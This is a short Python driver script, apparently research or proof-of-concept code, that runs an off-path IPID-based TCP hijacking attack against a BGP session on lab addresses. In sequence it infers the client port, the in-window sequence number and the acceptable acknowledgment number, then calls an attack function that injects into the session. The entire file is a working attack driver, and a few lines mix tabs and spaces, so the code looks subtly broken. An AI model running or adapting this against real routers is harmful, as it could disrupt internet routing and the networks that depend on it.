# coding=utf-8

import time

from IPID_HCSC.collision_find_s2 import Collision_Finder_2
from IPID_HCSC.connetcion_find import Connection_Finder
from IPID_HCSC.seq_find import Seq_Finder
from IPID_HCSC.ack_find import Ack_Finder, attack_action_bgp

if __name__ == '__main__':
    server_mac = '60:eb:69:dc:1b:14'
    server_ip = '192.168.66.112'
    server_port = 179

    client_ip = '192.168.66.111'

    attack_bind_if = 'eno1'
    own_ip_prefix = '192.168.0.0'
    collision_ip = '192.168.4.107'

    #collision = Collision_Finder_2(client_ip=client_ip, server_ip=server_ip, server_mac_addr=server_mac,
    #                               owned_prefix=own_ip_prefix, bind_iface=attack_bind_if, verbose=True)
    #collision.run()
    #collison_ip = collision.result

    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip, verbose=True,
                                   num_check=5,server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
    connection.run()
    client_port = connection.result

    time.sleep(5)
    seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                     server_port=server_port, client_port=client_port, check_num=5,
                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=True)
    seq.run()
    seq_in_win = seq.result

    if seq_in_win == -1:
        print('Seq Find Miss')
    else:
        ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                         server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                         server_mac=server_mac, bind_if_name=attack_bind_if)
        ack.run_attack_bgp()
        seq_exact = ack.seq_num
	ack_acceptable = ack.ack_in_win
	time.sleep(0.5)
        attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
                          server_port=server_port, seq=seq_exact, ack=ack_acceptable, ifname=attack_bind_if)
